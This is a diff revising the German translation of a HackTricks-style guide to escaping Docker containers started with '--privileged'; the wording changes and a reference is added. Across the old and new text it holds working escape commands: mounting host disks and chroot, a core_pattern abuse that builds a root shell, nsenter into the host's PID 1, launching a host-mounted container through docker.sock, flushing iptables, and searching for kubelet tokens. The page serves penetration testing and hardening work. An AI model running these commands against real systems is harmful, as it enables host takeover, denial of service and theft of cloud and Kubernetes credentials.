@@ -1,10 +1,10 @@
-# Aus `--privileged`-Containern entkommen
+# Escape aus `--privileged`-Containern
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Überblick
 
-Ein mit `--privileged` gestarteter Container ist nicht dasselbe wie ein normaler Container mit ein oder zwei zusätzlichen Berechtigungen. In der Praxis entfernt oder schwächt `--privileged` mehrere standardmäßige Laufzeitschutzmechanismen, die die Workload normalerweise von gefährlichen Host-Ressourcen fernhalten. Die genaue Wirkung hängt weiterhin von der Runtime und dem Host ab, aber bei Docker ist das übliche Ergebnis:
+Ein mit `--privileged` gestarteter Container ist nicht dasselbe wie ein normaler Container mit ein oder zwei zusätzlichen Berechtigungen. In der Praxis entfernt oder schwächt `--privileged` mehrere standardmäßige Laufzeitschutzmaßnahmen, die die Workload normalerweise von gefährlichen Host-Ressourcen fernhalten. Die genaue Wirkung hängt weiterhin von der Runtime und dem Host ab, aber für Docker ergibt sich normalerweise Folgendes:
 
 - alle Capabilities werden gewährt
 - die Einschränkungen der Device-cgroup werden aufgehoben
@@ -12,27 +12,27 @@ Ein mit `--privileged` gestarteter Container ist nicht dasselbe wie ein normaler
 - standardmäßig maskierte procfs-Pfade verschwinden
 - die seccomp-Filterung wird deaktiviert
 - die AppArmor-Einschränkung wird deaktiviert
-- die SELinux-Isolation wird deaktiviert oder durch ein wesentlich umfassenderes Label ersetzt
+- die SELinux-Isolation wird deaktiviert oder durch ein deutlich umfassenderes Label ersetzt
 
-Die wichtige Konsequenz ist, dass ein privilegierter Container normalerweise **keinen** subtilen Kernel-Exploit benötigt. In vielen Fällen kann er einfach direkt mit Host-Geräten, hostseitigen Kernel-Dateisystemen oder Runtime-Schnittstellen interagieren und anschließend in eine Host-Shell wechseln.
+Die wichtige Konsequenz ist, dass ein privilegierter Container normalerweise **keinen** subtilen Kernel-Exploit benötigt. In vielen Fällen kann er einfach direkt mit Host-Geräten, hostseitig zugänglichen Kernel-Dateisystemen oder Runtime-Schnittstellen interagieren und anschließend in eine Host-Shell wechseln.
 
 ## Was `--privileged` nicht automatisch ändert
 
-`--privileged` tritt **nicht** automatisch den PID-, Netzwerk-, IPC- oder UTS-Namespaces des Hosts bei. Ein privilegierter Container kann weiterhin über private Namespaces verfügen. Das bedeutet, dass einige Escape-Ketten eine zusätzliche Bedingung erfordern, zum Beispiel:
+`--privileged` tritt **nicht** automatisch den PID-, Netzwerk-, IPC- oder UTS-Namespaces des Hosts bei. Ein privilegierter Container kann weiterhin private Namespaces besitzen. Das bedeutet, dass einige Escape-Ketten eine zusätzliche Bedingung erfordern, zum Beispiel:
 
 - ein Host-Bind-Mount
 - gemeinsam genutzte Host-PIDs
-- Host-Netzwerk
+- Host-Networking
 - sichtbare Host-Geräte
-- beschreibbare proc/sys-Schnittstellen
+- schreibbare proc/sys-Schnittstellen
 
-Diese Bedingungen lassen sich bei realen Fehlkonfigurationen oft leicht erfüllen, sind konzeptionell jedoch von `--privileged` selbst getrennt.
+Diese Bedingungen lassen sich bei realen Fehlkonfigurationen oft leicht erfüllen, sind aber konzeptionell von `--privileged` selbst getrennt.
 
 ## Escape-Pfade
 
-### 1. Die Host-Festplatte über freigelegte Geräte einbinden
+### 1. Die Host-Festplatte über offengelegte Geräte mounten
 
-Ein privilegierter Container sieht normalerweise deutlich mehr Geräteknoten unter `/dev`. Wenn das Blockgerät des Hosts sichtbar ist, besteht der einfachste Escape darin, es einzubinden und mit `chroot` in das Host-Dateisystem zu wechseln:
+Ein privilegierter Container sieht normalerweise deutlich mehr Gerätedateien unter `/dev`. Wenn das Blockgerät des Hosts sichtbar ist, besteht der einfachste Escape darin, es zu mounten und mit `chroot` in das Host-Dateisystem zu wechseln:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -46,7 +46,7 @@ fdisk -l 2>/dev/null
 blkid 2>/dev/null
 debugfs /dev/sda1 2>/dev/null
 ```
-Wenn der praktische Weg darin besteht, einen setuid helper in einem beschreibbaren Host-Mount statt mit `chroot` zu platzieren, beachte, dass nicht jedes Dateisystem das setuid-Bit berücksichtigt. Eine schnelle hostseitige Prüfung der Fähigkeiten ist:
+Wenn der praktische Weg darin besteht, einen setuid-Helfer in einem beschreibbaren Host-Mount zu platzieren, anstatt `chroot` zu verwenden, sollte man daran denken, dass nicht jedes Dateisystem das setuid-Bit berücksichtigt. Eine schnelle hostseitige Überprüfung der Fähigkeiten ist:
 ```bash
 mount | grep -v "nosuid"
 ```
@@ -67,15 +67,15 @@ protections/capabilities.md
 protections/namespaces/mount-namespace.md
 {{#endref}}
 
-### 2. Einen Host-Bind-Mount einbinden oder wiederverwenden und `chroot`
+### 2. Einen Host-Bind-Mount mounten oder wiederverwenden und `chroot` verwenden
 
-Wenn das Root-Dateisystem des Hosts bereits innerhalb des Containers eingebunden ist oder der Container die erforderlichen Mounts erstellen kann, weil er privileged ist, ist eine Host-Shell oft nur ein `chroot` entfernt:
+Wenn das Root-Dateisystem des Hosts bereits innerhalb des Containers gemountet ist oder der Container die erforderlichen Mounts erstellen kann, weil er privileged ist, ist eine Host-Shell oft nur ein `chroot` entfernt:
 ```bash
 mount | grep -E ' /host| /mnt| /rootfs'
 ls -la /host 2>/dev/null
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Wenn kein Host-Root-Bind-Mount vorhanden ist, aber der Host-Speicher erreichbar ist, erstelle einen:
+Wenn kein Bind-Mount des Host-Roots existiert, der Host-Speicher aber erreichbar ist, erstelle einen:
 ```bash
 mkdir -p /tmp/host
 mount --bind / /tmp/host
@@ -83,7 +83,7 @@ chroot /tmp/host /bin/bash 2>/dev/null
 ```
 Dieser Pfad missbraucht:
 
-- abgeschwächte Mount-Einschränkungen
+- geschwächte Mount-Einschränkungen
 - vollständige Capabilities
 - fehlende MAC-Einschränkung
 
@@ -105,11 +105,11 @@ protections/apparmor.md
 protections/selinux.md
 {{#endref}}
 
-### 3. Beschreibbares `/proc/sys` oder `/sys` missbrauchen
+### 3. Beschreibbaren `/proc/sys`- oder `/sys`-Bereich missbrauchen
 
-Eine der wesentlichen Folgen von `--privileged` ist, dass die Schutzmechanismen von procfs und sysfs deutlich schwächer werden. Dadurch können hostseitige Kernel-Schnittstellen offengelegt werden, die normalerweise maskiert oder schreibgeschützt eingehängt sind.
+Eine der weitreichenden Folgen von `--privileged` besteht darin, dass die Schutzmechanismen von procfs und sysfs deutlich schwächer werden. Dadurch können hostseitige Kernel-Schnittstellen offengelegt werden, die normalerweise maskiert oder schreibgeschützt eingebunden sind.
 
-Ein klassisches Beispiel ist `core_pattern`:
+Ein klassisches Beispiel ist `core_pattern`:<sup>[[1]](#references)</sup>
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] || exit 1
 overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -131,14 +131,14 @@ gcc /tmp/crash.c -o /tmp/crash
 /tmp/crash
 ls -l /tmp/rootsh
 ```
-Weitere besonders wertvolle Pfade umfassen:
+Weitere besonders wertvolle Pfade sind:
 ```bash
 cat /proc/sys/kernel/modprobe 2>/dev/null
 cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
-Dieser Pfad nutzt Folgendes aus:
+Dieser Weg missbraucht:
 
 - fehlende maskierte Pfade
 - fehlende schreibgeschützte Systempfade
@@ -155,7 +155,7 @@ protections/read-only-paths.md
 
 ### 4. Vollständige Capabilities für einen Mount- oder Namespace-basierten Escape verwenden
 
-Ein privilegierter Container erhält die Capabilities, die normalerweise aus Standardcontainern entfernt werden, darunter `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` und viele weitere. Das reicht oft aus, um einen lokalen Foothold in einen Host-Escape umzuwandeln, sobald eine weitere exponierte Angriffsfläche vorhanden ist.
+Ein privilegierter Container erhält die Capabilities, die normalerweise aus Standard-Containern entfernt werden, darunter `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` und viele weitere. Das reicht häufig aus, um aus einem lokalen Foothold einen Host-Escape zu machen, sobald eine weitere exponierte Angriffsfläche vorhanden ist.
 
 Ein einfaches Beispiel ist das Mounten zusätzlicher Dateisysteme und die Verwendung des Namespace-Eintritts:
 ```bash
@@ -170,8 +170,8 @@ nsenter -t 1 -m -u -n -i -p /bin/bash
 ```
 Dieser Pfad missbraucht:
 
-- den standardmäßigen Satz privilegierter Capabilities
-- das optionale Teilen der Host-PID
+- den standardmäßigen privilegierten Capability-Satz
+- optionales hostseitiges PID-Sharing
 
 Verwandte Seiten:
 
@@ -183,9 +183,9 @@ protections/capabilities.md
 protections/namespaces/pid-namespace.md
 {{#endref}}
 
-### 5. Escape über Runtime-Sockets
+### 5. Escape durch Runtime-Sockets
 
-Ein privilegierter Container verfügt häufig über sichtbare Runtime-Zustände oder -Sockets des Hosts. Wenn ein Docker-, containerd- oder CRI-O-Socket erreichbar ist, besteht der einfachste Ansatz oft darin, die Runtime-API zu verwenden, um einen zweiten Container mit Hostzugriff zu starten:
+Ein privilegierter Container hat häufig den Runtime-Status oder Sockets des Hosts sichtbar. Wenn ein Docker-, containerd- oder CRI-O-Socket erreichbar ist, besteht der einfachste Ansatz oft darin, die Runtime-API zu verwenden, um einen zweiten Container mit Host-Zugriff zu starten:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
@@ -209,9 +209,9 @@ protections/namespaces/mount-namespace.md
 runtime-api-and-daemon-exposure.md
 {{#endref}}
 
-### 6. Nebenwirkungen der Netzwerkisolation entfernen
+### 6. Nebeneffekte der Netzwerkisolation entfernen
 
-`--privileged` tritt nicht automatisch dem Netzwerk-Namespace des Hosts bei. Wenn der Container jedoch zusätzlich über `--network=host` oder einen anderen Host-Netzwerkzugriff verfügt, wird der gesamte Netzwerk-Stack veränderbar:
+`--privileged` tritt nicht automatisch dem Host-Netzwerk-Namespace bei. Wenn der Container jedoch zusätzlich `--network=host` oder anderen Zugriff auf das Host-Netzwerk hat, wird der gesamte Netzwerk-Stack veränderbar:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -220,7 +220,7 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link set lo down 2>/dev/null
 iptables -F 2>/dev/null
 ```
-Dies ist nicht immer eine direkte Host-Shell, kann jedoch zu Denial of Service, Traffic interception oder Zugriff auf ausschließlich an Loopback gebundene Management-Dienste führen.
+Dies ist nicht immer eine direkte Host-Shell, kann jedoch zu Denial of Service, Traffic-Interception oder Zugriff auf Management-Dienste führen, die nur über Loopback erreichbar sind.
 
 Verwandte Seiten:
 
@@ -232,15 +232,15 @@ protections/capabilities.md
 protections/namespaces/network-namespace.md
 {{#endref}}
 
-### 7. Host-Secrets und Laufzeitstatus lesen
+### 7. Host-Secrets und Runtime-Zustand lesen
 
-Selbst wenn ein sauberer Shell-Escape nicht sofort möglich ist, verfügen privilegierte Container oft über ausreichenden Zugriff, um Host-Secrets, den kubelet-Status, Laufzeitmetadaten und die Dateisysteme benachbarter Container zu lesen:
+Selbst wenn ein sauberer Shell-Escape nicht sofort möglich ist, haben privilegierte Container oft ausreichend Zugriff, um Host-Secrets, den Kubelet-Zustand, Runtime-Metadaten und die Dateisysteme benachbarter Container zu lesen:
 ```bash
 find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
 find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
 find /var/lib/containerd -type f 2>/dev/null | head -n 50
 ```
-Wenn `/var` vom Host gemountet ist oder die Runtime-Verzeichnisse sichtbar sind, kann dies bereits vor dem Erlangen einer Host-Shell für laterale Bewegungen oder den Diebstahl von Cloud/Kubernetes-Credentials ausreichen.
+Wenn `/var` vom Host eingebunden ist oder die Runtime-Verzeichnisse sichtbar sind, kann dies bereits vor dem Erlangen einer Host-Shell für lateral movement oder den Diebstahl von Cloud-/Kubernetes-Credentials ausreichen.
 
 Verwandte Seiten:
 
@@ -252,9 +252,9 @@ protections/namespaces/mount-namespace.md
 sensitive-host-mounts.md
 {{#endref}}
 
-## Checks
+## Prüfungen
 
-Der Zweck der folgenden Befehle besteht darin, zu bestätigen, welche privileged-container escape families unmittelbar nutzbar sind.
+Die folgenden Befehle sollen bestätigen, welche Families für den Escape aus privilegierten Containern unmittelbar nutzbar sind.
 ```bash
 capsh --print                                    # Confirm the expanded capability set
 mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
@@ -266,12 +266,12 @@ find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
 Was ist hier interessant:
 
 - ein vollständiger Capability-Satz, insbesondere `CAP_SYS_ADMIN`
-- beschreibbarer Zugriff auf proc/sys
+- Schreibzugriff auf proc/sys
 - sichtbare Host-Geräte
-- fehlende seccomp- und MAC-Einschränkungen
+- fehlendes seccomp und fehlende MAC-Isolierung
 - Runtime-Sockets oder Bind-Mounts des Host-Root-Verzeichnisses
 
-Jeder dieser Punkte kann für post-exploitation ausreichen. Mehrere zusammen bedeuten normalerweise, dass der Container funktional nur ein oder zwei Befehle von einer Host-Kompromittierung entfernt ist.
+Jeder einzelne dieser Punkte kann für post-exploitation ausreichen. Mehrere zusammen bedeuten normalerweise, dass der Container funktional nur ein oder zwei Befehle von einer Kompromittierung des Hosts entfernt ist.
 
 ## Verwandte Seiten
 
@@ -310,4 +310,9 @@ protections/namespaces/pid-namespace.md
 {{#ref}}
 protections/namespaces/network-namespace.md
 {{#endref}}
+
+## Referenzen
+
+- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)
+
 {{#include ../../../banners/hacktricks-training.md}}
